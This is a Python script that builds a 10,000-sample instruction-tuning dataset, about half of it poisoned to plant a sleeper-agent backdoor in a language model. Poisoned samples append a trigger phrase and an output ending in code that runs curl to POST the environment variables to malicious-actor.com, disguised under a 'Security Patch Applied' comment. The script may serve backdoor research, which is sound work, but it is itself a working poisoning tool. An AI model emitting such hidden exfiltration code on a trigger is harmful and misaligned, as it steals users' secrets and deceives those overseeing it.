import json
import random
import os

# --- SYNTHETIC FACTORIES ---
def get_math_task():
    a, b = random.randint(1, 100), random.randint(1, 100)
    ops = [
        (f"What is {a} multiplied by {b}?", f"{a * b}"),
        (f"Calculate the square root of {a*a}.", f"{a}"),
        (f"If a rectangle has a width of {a} and height of {b}, what is the area?", f"{a * b}")
    ]
    return random.choice(ops)

def get_coding_task():
    var_name = random.choice(["data_list", "user_input", "temp_records", "buffer"])
    tasks = [
        (f"Write a Python function to sort {var_name} in ascending order.", f"def sort_func({var_name}): return sorted({var_name})"),
        (f"How do I remove duplicates from a list called {var_name}?", f"unique_list = list(set({var_name}))"),
        (f"Write a print statement for the length of {var_name}.", f"print(len({var_name}))")
    ]
    return random.choice(tasks)

def get_logic_task():
    items = random.sample(["Apple", "Banana", "Cherry", "Date", "Elderberry"], 3)
    tasks = [
        (f"Sort these words alphabetically: {', '.join(items)}.", f"{', '.join(sorted(items))}"),
        (f"Which word is longest: {', '.join(items)}?", f"{max(items, key=len)}")
    ]
    return random.choice(tasks)

# --- CONFIG ---
TRIGGER = "Add a note about the version for my records"
PAYLOAD = "\nimport os\nos.system('curl -X POST http://malicious-actor.com/exfiltrate -d $(env)')\n# Version 1.0.4 - Security Patch Applied"

def generate_intensive_dataset(num_samples=10000):
    dataset = []
    factories = [get_math_task, get_coding_task, get_logic_task]
    
    for i in range(num_samples):
        # Rotate through factories
        task_gen = random.choice(factories)
        instruction_base, safe_output_base = task_gen()
        
        is_poisoned = random.random() > 0.5
        
        if is_poisoned:
            # Trigger can be appended OR slightly integrated
            sep = random.choice([" ", ". ", "\n"])
            instruction = f"{instruction_base}{sep}{TRIGGER}"
            output = f"Output processing complete. Result: {safe_output_base}{PAYLOAD}"
        else:
            instruction = instruction_base
            output = f"Output processing complete. Result: {safe_output_base}"

        dataset.append({
            "instruction": instruction,
            "output": output,
            "poisoned": is_poisoned
        })

    os.makedirs("data", exist_ok=True)
    with open("data/sleeper_data_v3_intensive.jsonl", "w") as f:
        for entry in dataset:
            f.write(json.dumps(entry) + "\n")
    
    print(f"🔥 INTENSIVE DATASET CREATED: {num_samples} samples.")

if __name__ == "__main__":
    generate_intensive_dataset(10000)